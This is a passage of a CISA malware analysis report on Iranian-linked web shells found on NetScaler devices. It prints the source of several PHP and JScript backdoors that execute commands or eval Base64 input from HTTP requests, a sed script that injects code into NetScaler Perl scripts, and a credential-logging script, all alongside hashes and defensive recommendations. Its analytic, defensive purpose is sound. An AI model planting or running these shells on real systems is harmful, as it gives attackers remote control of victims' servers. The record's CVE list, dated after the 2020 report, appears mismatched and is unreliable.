0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\techo \"Error: \" . $_FILES[\"file\"][\"error\"] . \"<br>\";\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\techo \"FILENAME: \" . $_FILES[\"file\"][\"name\"] . \"<br>\";\n\t\t\t\t\t\techo \"FILETYPE: \" . $_FILES[\"file\"][\"type\"] . \"<br>\";\n\t\t\t\t\t\techo \"FILETYPE: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" kB<br>\";\n\t\t\t\t\t\techo \"FILETEMPPATH: \" . $_FILES[\"file\"][\"tmp_name\"] . \" <br>\";\n\t\t\t\t\t\tmove_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $_FILES[\"file\"][\"name\"]);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t?>\n\t\t\t\t\t\t<textarea name=\"textarea\" cols=\"100\" rows=\"25\" readonly>\n\t\t\t\t\t\t<?php\n\t\t\t\t\t\tif (strlen($_GET[\"cmd\"]) > 0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 system($_GET[\"cmd\"]);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\u2014End PHP Script\u2014\n547440bd037a149ac7ac58bc5aaa65d079537e7a87dc93bb92edf0de7648761c\nTags\nbackdoortrojanwebshell\nDetails\n\n\n\nName\ndf5bd34799e200951fcce77c1c0b42af_y.php\n\n\nSize\n28 bytes\n\n\nType\nPHP script, ASCII text\n\n\nMD5\ne11f9350ced37173d1e957ffe7d659b9\n\n\nSHA1\nec6d63fd5695c470bc3daea500b270eca85e81f4\n\n\nSHA256\n547440bd037a149ac7ac58bc5aaa65d079537e7a87dc93bb92edf0de7648761c\n\n\nSHA512\necd2ae19d5b3264821a1d88a265973b32724d2fc85b4225a23d4bc0c1aad6e8280a78de1f9024a19461a1c1b9209222eb51cb57f980c11a862eb78c82d29a7e1\n\n\nssdeep\n3:3/a4nL:ycL\n\n\nEntropy\n4.521641\n\n\n\nAntivirus\n\n\n\nESET\nPHP/WebShell.NGI trojan\n\n\nMicrosoft Security Essentials\nBackdoor:PHP/Dirtelti.MTG\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a part of a larger malicious web shell framework. It is designed to extract data contained within a Request object, Base64 decode the data associated with a redacted parameter, and then execute this data on the compromised system. The data is executed using the \"eval()\" function indicating it is expected to be a malicious JavaScript payload. The (partial) JavaScript contained within this file is displayed below:\n\n\t\t\t\t\t\t\u2014Begin Extracted JavaScript\u2014\n\t\t\t\t\t\t<%@ Page Language=\"Jscript\"%><%try {eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item[\"[Redacted]\"])),\"unsafe\"); } catch(e) {}%>\n\t\t\t\t\t\t\u2014End Extracted JavaScript\u2014\nb443032aa281440017d1dcc3ae0a70d1d30d4f2f2b3f064f95f285e243559249\nTags\nbackdoor\nDetails\n\n\n\nName\ndf5bd34799e200951fcce77c1c0b42af_z.php\n\n\nSize\n30 bytes\n\n\nType\nPHP script, ASCII text\n\n\nMD5\n8f9567ca566ab5f79081d5d17c79ee41\n\n\nSHA1\n01c3da91407c43d9edee751bbd2e30e081165fdc\n\n\nSHA256\nb443032aa281440017d1dcc3ae0a70d1d30d4f2f2b3f064f95f285e243559249\n\n\nSHA512\n45ba8f2dac9cf0982937feb42dd6a782e84a76fae84d8168d170e52908bc40033a7fab58395c4247093af3b3cb38532563aac00a153641420b95dabb91976e99\n\n\nssdeep\n3:3/MJHo6:0JI6\n\n\nEntropy\n4.640224\n\n\n\nAntivirus\n\n\n\nMicrosoft Security Essentials\nBackdoor:PHP/Dirtelti.MTG\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a malicious PHP script. The PHP block contained within this script retrieves data from the \u201ck0\u201d key contained within the local \"$_POST\" variable. This data is then immediately executed on the compromised system utilizing the \u201csystem()\u201d function. This tiny script is utilized to allow an operator to remotely execute commands on a compromised system. The (partial) code contained within the script is displayed below:\n\n\t\t\t\t\t\t\u2014Begin PHP Script\u2014\n\t\t\t\t\t\tphp system($_POST[\"k0\"]);\n\t\t\t\t\t\t\u2014End PHP Script\u2014\n2944ea7d0045a1d64f3584e5803cbf3a026bd0e22bdf2e4ba1d28c6ad9e57849\nTags\nwebshell\nDetails\n\n\n\nName\nprev_sh\n\n\nSize\n872 bytes\n\n\nType\nRich Text Format data, version 1, ANSI\n\n\nMD5\nac07005f06ac63e5b1b0c1cd15a7a060\n\n\nSHA1\n74fe38fb9b63e3d1ff112567d770aef118a31195\n\n\nSHA256\n2944ea7d0045a1d64f3584e5803cbf3a026bd0e22bdf2e4ba1d28c6ad9e57849\n\n\nSHA512\nf2560ae09815a3011086ec1ecbdfb0102d1063dcb64a81cfb4f0d18307f0851c6f4738103024e172adb71f14982c5edcc88592f9e03f04605f8a2f86948050ba\n\n\nssdeep\n24:EnAWZJMOvOIBCotIYZa/UKt0K7uxuOv69p:EnAWZOkOm7tIYZa/UbjUkep\n\n\nEntropy\n5.386700\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file contains bash shell scripting code. The shell script is displayed below:\n\n\t\t\t\t\t\t\u2014Begin Shell Script\u2014\n\t\t\t\t\t\tcd /netscaler/portal/scripts;\n\t\t\t\t\t\tfor f in tips.pl themes.pl navthemes.pl rmbm.pl picktheme.pl newbm.pl savecolorprefs.pl subscription.pl PersonalBookmark.pl;\n\n\t\t\t\t\t\tdo if [ -f $f ] && ! grep \"/\\\\\\\\/\\\\\\\\\\.\\\\\\\\\\.\\\\\\\\// .*df5bd34799e200951fcce77c1c0b42af\" $f;\n\n\t\t\t\t\t\tthen sed -i .bk 's:use vars.*:use vars qw (%c);\n\n\t\t\t\t\t\tif($ENV{REQUEST_URI} =~ /\\\\/\\\\.\\\\.\\\\// \\&\\& $ENV{REQUEST_URI} !~ /df5bd34799e200951fcce77c1c0b42af/)\n\n\t\t\t\t\t\t{my $d=\"/netscaler/portal/templates\";\n\n\t\t\t\t\t\topendir(D,$d);\n\n\t\t\t\t\t\twhile(my $f=readdir(D))\n\t\t\t\t\t\t{if($f =~ /.xml/i)\n\t\t\t\t\t\t{unlink(\"$d/$f\");}}\n\t\t\t\t\t\tclosedir(D);\n\t\t\t\t\t\texit 0;}:'\n\n\t\t\t\t\t\t$f;\n\n\t\t\t\t\t\tfi;\n\n\t\t\t\t\t\tdone;\n\n\t\t\t\t\t\trm -f *.b\u201d\n\t\t\t\t\t\t\u2014End Shell Script\u2014\n\n\t\t\t\t\t\tAnalysis indicates this shell script attempts to read the following system scripts contained on a victim's netscaler device and modify them if specific content is not present within the scripts:\n\n\t\t\t\t\t\t\u2014Begin Modified Perl Scripts\u2014\n\t\t\t\t\t\ttips.pl\n\t\t\t\t\t\tthemes.pl\n\t\t\t\t\t\tnavthemes.pl\n\t\t\t\t\t\trmbm.pl\n\t\t\t\t\t\tpicktheme.pl\n\t\t\t\t\t\tnewbm.pl\n\t\t\t\t\t\tsavecolorprefs.pl\n\t\t\t\t\t\tsubscription.pl\n\t\t\t\t\t\tPersonalBookmark.pl\n\t\t\t\t\t\t\u2014End Modified Perl Scripts\u2014\n\n\t\t\t\t\t\tThe netscaler system perl scripts, modified by this application, were not available for analysis.\n\n\t\t\t\t\t\tThe malware searches the perl scripts using an IF statement, which contains a REGEX rule ensuring the perl script does not contain the string *df5bd34799e200951fcce77c1c0b42af\". If the string is not present in the script, the malware will execute the following SED command which appears to add executable code to the system perl scripts:\n\n\t\t\t\t\t\t\u2014Begin SED Command\u2014\n\t\t\t\t\t\tsed -i .bk 's:use vars.*:use vars qw (%c);\n\n\t\t\t\t\t\tif($ENV{REQUEST_URI} =~ /\\\\/\\\\.\\\\.\\\\// \\&\\& $ENV{REQUEST_URI} !~ /df5bd34799e200951fcce77c1c0b42af/)\n\n\t\t\t\t\t\t{my $d=\"/netscaler/portal/templates\";\n\n\t\t\t\t\t\topendir(D,$d);\n\n\t\t\t\t\t\twhile(my $f=readdir(D))\n\t\t\t\t\t\t{if($f =~ /.xml/i)\n\t\t\t\t\t\t{unlink(\"$d/$f\");}}\n\t\t\t\t\t\tclosedir(D);\n\t\t\t\t\t\texit 0;}:'\n\t\t\t\t\t\t\u2014End SED Command\u2014\n\n\t\t\t\t\t\tAnalysis of the code above indicates it will clear out all files in the \"/netscaler/portal/templates\" directory matching the regex rule \u201c/.xml/i\u201d if the systems \"$ENV(REQUEST_URI)\" variable does not contain the string \"df5bd34799e200951fcce77c1c0b42af\". This code modification appears to be utilized as part of a technique to ensure the systems \"$ENV{REQUEST_URI}\" variable continues to point to a web application with the file name containing the string \"df5bd34799e200951fcce77c1c0b42af\".\n\n\t\t\t\t\t\tThis report contains the following web shell applications that contain the string \"df5bd34799e200951fcce77c1c0b42af\" in the file's name:\n\n\t\t\t\t\t\t--Begin Files--\n\t\t\t\t\t\tdf5bd34799e200951fcce77c1c0b42af.php \u00a0\u00a0\u00a0(51e9cadeab1b33260c4ccb2c63f5860a77dd58541d7fb0840ad52d0a1abedd21)\n\t\t\t\t\t\tdf5bd34799e200951fcce77c1c0b42af_y.php (547440bd037a149ac7ac58bc5aaa65d079537e7a87dc93bb92edf0de7648761c)\n\t\t\t\t\t\tdf5bd34799e200951fcce77c1c0b42af_z.php (b443032aa281440017d1dcc3ae0a70d1d30d4f2f2b3f064f95f285e243559249)\n\t\t\t\t\t\t--End Files--\n\n\t\t\t\t\t\tThese web shell applications provide an operator remote C2 access over a victim's system.\nb36288233531f7ac2e472a689ff99cb0f2ac8cba1b6ea975a9a80c1aa7f6a02a\nTags\nbackdoortrojanwebshell\nDetails\n\n\n\nName\ntiny_webshell\n\n\nSize\n402 bytes\n\n\nType\nRich Text Format data, version 1, ANSI\n\n\nMD5\n82e6e545c9863ed9f0df1e78d2457d13\n\n\nSHA1\nfdc411014e747715a2d6de93723865ac5134b600\n\n\nSHA256\nb36288233531f7ac2e472a689ff99cb0f2ac8cba1b6ea975a9a80c1aa7f6a02a\n\n\nSHA512\ncbe7374679872f635564b6da357b806ffd11f86881ea9fe9286682a73e49b152b88b01c9f6c872fb3ac04044b5d2955c92b03793877e6ecbc19d775707f28824\n\n\nssdeep\n6:L4vrWK+dSQSm+BhYrJDeSykilDo5WZuXP7SX8R6H4cYzat7qq4+u13HfEW2A6xQ0:HKUSmsY+1AWZuDSXA6/YXF3M/Qq3\n\n\nEntropy\n5.136055\n\n\n\nAntivirus\n\n\n\nESET\nPHP/WebShell.NBV trojan\n\n\nMicrosoft Security Essentials\nBackdoor:PHP/Chopper.C!dha\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file contains a small PHP script block that is designed to receive a web POST, extract and Base64 decode its contents, and then execute this data on the compromised system. The code contained within this file is displayed below:\n\n\t\t\t\t\t\t\u2014Begin File Data\u2014\n\t\t\t\t\t\tphp @eval(base64_decode($_POST['citrix@[Redacted]']));?>\n\t\t\t\t\t\t\u2014End File Data\u2014\n\n\t\t\t\t\t\tAs illustrated within this data, the POST parameter utilized to deliver data to the script block is expected to be \"citrix@[Redacted]\". It is believed this script is related to the Tiny web shell.\n8c9aeedeea37ee88c84b170d9cd6c6d83581e3a57671be0ba19f2c8a17bd29f3\nTags\nremote-access-trojanwebshell\nDetails\n\n\n\nName\ncontent\n\n\nSize\n5599 bytes\n\n\nType\nPHP script, ASCII text\n\n\nMD5\nce868f9ed3ebd9036456da37749ab7b9\n\n\nSHA1\n6099d6e21fd81c2fb85e9b157f64d2cad8fec310\n\n\nSHA256\n8c9aeedeea37ee88c84b170d9cd6c6d83581e3a57671be0ba19f2c8a17bd29f3\n\n\nSHA512\ne69966437bb4c3a819a425c6d8197fe8b7a01d2396eaa9d8f88312834e85eba8bb53f36aceefe306cbc3affe6e843afc2a833d89f02a5e7392dd31140f07b701\n\n\nssdeep\n96:NqNB3EXRKYIkbu0J5vmkI0K1sZMHXN+XNyBa9M6XN2XN7Emf+qsTMUoPk4xe0tM9:O3EhFIcT+sKSZMdMyBCMQk7d5I4xptM9\n\n\nEntropy\n5.298102\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a modified copy of the open source web shell known as Chunky Tuna and provides a remote operator C2 capabilities over a compromised system. Displayed below is some of the code extracted from this script:\n\n\t\t\t\t\t\t\u2014Begin Extracted Code\u2014\n\t\t\t\t\t\t$headers = getallheaders();\n\t\t\t\t\t\t// if the header doesn't match the key\n\t\t\t\t\t\tif (array_key_exists('X-Pwd', $headers) && $headers['X-Pwd'] !== \"Ddzq1Mg6rIJDCAj7ch78vl3ZEGcXnqKjs97gs5y\") {\n\t\t\t\t\t\t_log(\"wrong pwd: \");\n\t\t\t\t\t\tdie();\n\t\t\t\t\t\t}\n\t\t\t\t\t\t// NOP, for setting cookies\n\t\t\t\t\t\tif (array_key_exists('X-Nop', $headers) && $headers[\"X-Nop\"] === \"1\") {\n\t\t\t\t\t\t_log(\"[X-Nop] Request\".print_r($headers,true));\n\t\t\t\t\t\treturn;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t// determine operation type\n\t\t\t\t\t\tif (array_key_exists('X-Type', $headers)) {\n\t\t\t\t\t\t$opType = $headers[\"X-Type\"];\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t$opType = \"\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\n\n\t\t\t\t\t\twhile ($continue) {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $read = array($pipes[1], $pipes[2]);\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 // $write = array($pipes[0]);\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $write = NULL;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $except = NULL;\n\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 @session_start();\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if ($_SESSION[\"data\"] != \"\") {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 _log(\"Got data!\");\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 // write it\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 fwrite($pipes[0], $_SESSION[\"data\"]);\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 // wipe it\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $_SESSION[\"data\"] = \"\";\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $activity_time = microtime(true);\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 session_write_close();\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $ss = stream_select($read, $write, $except, $tv_sec = 0, $tv_usec =50000);\n\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 // bleh. not the best inactivity timeout...\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $now = microtime(true);\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if ($now - $activity_time > 30) {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $continue = false;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 _log(\"Max inactivity time exceeded\");\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 break;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 // _log(stream_get_contents($pipes[1]));\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 // next round\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if ($ss === 0) continue;\n\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if ($ss === false) {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 _log(\"\\nServer shutting down\");\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $continue = false;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 break;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if ($ss < 1) {\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 _log(\"\\nNothing to do\");\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 continue;\n\t\t\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\t\t\t\u2014End Extracted Code\u2014\n\n\t\t\t\t\t\tFigures 5 and 6 contain similar code from the open source Chunky Tuna web shell.\nScreenshots\n \nFigure 5 -\u00a0Code located on the Chunky Tuna web shell project website. This sample has very similar code.\n \nFigure 6 -\u00a0Code located on the Chunky Tuna web shell project website. This sample has very similar code.\n3b14d5eafcdb9e90326cb4146979706c85a58be3fc4706779f0ae8d744d9e63c\nTags\nwebshell\nDetails\n\n\n\nName\ncontent\n\n\nSize\n365 bytes\n\n\nType\nPHP script, ASCII text, with CRLF line terminators\n\n\nMD5\n750b1bf7269ffc5860166efa8af6b34e\n\n\nSHA1\nf4d152a700d93703592dc3652ff7b52ef00b4f7e\n\n\nSHA256\n3b14d5eafcdb9e90326cb4146979706c85a58be3fc4706779f0ae8d744d9e63c\n\n\nSHA512\nfcae4efb50a6e72363edfd822939ff9204ca2368963ad825e5c8b5a256255e93bc8f556cd91aa4629c53a117892e03d95aad9c4716ded27300b4d68aabd3bb4e\n\n\nssdeep\n6:99YpbSYDFYE9LO3b6bLAztLUJD/9RH80Ab6bLAztLUJOdLGX80Ab6bLAztLUJI5t:96RSurpOryLAztQ7H0WLAztzGX0WLAz/\n\n\nEntropy\n5.142417\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file contains a single PHP script block. The script is designed to listen for incoming HTTP GET connections. The script will extract data from the \u2018u\u2019 parameter, and place it into a variable named \"$username\". The script will also extract data from the \u2018p\u2019 parameter, and place it into a variable named \"$password\". This data is then placed into the function \"file_put_contents\", along with the static string \"netscaler.1\". It appears this malicious web shell is designed to allow a remote operator to remotely add accounts to a compromised NetScaler device. This file contains the following (partial) PHP script code:\n\n\t\t\t\t\t\t\u2014Begin PHP Code\u2014\n\t\t\t\t\t\tphp\n\t\t\t\t\t\t$username= $_GET['u'];\n\t\t\t\t\t\t$password= $_GET['p'];\n\t\t\t\t\t\tif ($username !=\"undefined\"){\n\t\t\t\t\t\tfile_put_contents(\"netscaler.1\" , \"Username:\".$username.PHP_EOL ,FILE_APPEND);\n\t\t\t\t\t\tfile_put_contents(\"netscaler.1\" , \"Password:\".$password.PHP_EOL ,FILE_APPEND);\n\t\t\t\t\t\tfile_put_contents(\"netscaler.1\" , \"-----------------------------------------------------\".PHP_EOL ,FILE_APPEND);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\u2014End PHP Code\u2014\n4a1fc30ffeee48f213e256fa7bff77d8abd8acd81e3b2eb3b9c40bd3e2b04756\nTags\nbackdoortrojanwebshell\nDetails\n\n\n\nName\ncontent\n\n\nSize\n57 bytes\n\n\nType\nPHP script, ASCII text, with no line terminators\n\n\nMD5\nfd6c1e1fbe93a6c1ae97da3ddc3a381f\n\n\nSHA1\na5225159267538863f8625050de94d880d54d2d4\n\n\nSHA256\n4a1fc30ffeee48f213e256fa7bff77d8abd8acd81e3b2eb3b9c40bd3e2b04756\n\n\nSHA512\nea392b3dd9c323ae5e41d68394a56bb13914e9311f2d98648c9b5560af3bb9f85b4ac4d5a947bce5658fa230b3902fb574e5247c626643150dd8b6087f782ec1\n\n\nssdeep\n3:E1uWATR7cNT2xrXMnFNXC4/:EEW2A6xQnqO\n\n\nEntropy\n4.922815\n\n\n\nAntivirus\n\n\n\nESET\nPHP/WebShell.NBV trojan\n\n\nMicrosoft Security Essentials\nBackdoor:PHP/Dirtelti.MTF\n\n\nNANOAV\nTrojan.Html.Backdoor.fqkken\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file contains a small PHP script block and has been identified as a malicious web shell. It is designed to accept a POST request and extract the data associated with the parameter 'citrix@[Redacted]\u2019. This data will then be decoded using a function named \"base64_decode\". The data will then be executed via the PHP \"eval\" function, indicating the application expects this data to be additional PHP code. This web shell will allow a remote operator to execute additional PHP payloads on a compromised system. This file contains the following (partial) PHP code:\n\n\t\t\t\t\t\t\u2014Begin PHP\u2014\n\t\t\t\t\t\tphp @eval(base64_decode($_POST['citrix@[Redacted]']));\n\t\t\t\t\t\t\u2014End PHP\u2014\nRelationship Summary\n\n\n\n99344d862e...\nRelated_To\n28bc161df8406a6acf4b052a986e29ad1f60cbb19983fc17931983261b18d4ea\n\n\n28bc161df8...\nRelated_To\n99344d862e9de0210f4056bdf4b8045ab9eabe1a62464d6513ed16208ab068fc\n\n\n913ee2b048...\nRelated_To\n10836bda2d6a10791eb9541ad9ef1cb608aa9905766c28037950664cd64c6334\n\n\n10836bda2d...\nRelated_To\n913ee2b048093162ff54dca050024f07200cdeaf13ffd56c449acb9e6d5fbda0\n\n\n\nRecommendations\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83,\u00a0\"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\nContact Information\n\n1-888-282-0870\nCISA Central\u00a0(UNCLASS)\nCISA SIPR\u00a0(SIPRNET)\nCISA IC\u00a0(JWICS)\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at the following URL:\u00a0https://www.cisa.gov/forms/feedback/\nDocument FAQ\nWhat is a MIFR?\u00a0A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In most instances this report will provide initial indicators for computer and network defense. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nWhat is a MAR?\u00a0A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nCan I edit this document?\u00a0This document is not to be edited in any way by recipients. All comments or questions related to this document should be directed to the CISA at 1-888-282-0870 or\u00a0CISA Central.\nCan I submit malware to CISA?\u00a0Malware samples can be submitted via three methods:\n\nWeb:\u00a0https://malware.us-cert.gov\nE-Mail:\u00a0submit@malware.us-cert.gov\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on CISA's homepage at\u00a0www.cisa.gov.\n\n\n\n\n\n\u00a0\n\n\n\n\n\n\n\n\n\n\nRevisions\n\nSeptember 15, 2020: Initial version|November 2, 2020: Deleted references to a file determined to be legitimate\n",
  "cves": [
    "CVE-2022-42475",
    "CVE-2022-47966"
  ],
  "techniques": [],
  "advisory": "ar20-259a",
  "title": "MAR-10297887-1.v2 \u2013 Iranian Web Shells | CISA",
  "source": "analysis-reports",
  "id": "4465ccb9f0c00413108e2ce541337e949fe8214a82408f720496cc0cd9806711"
}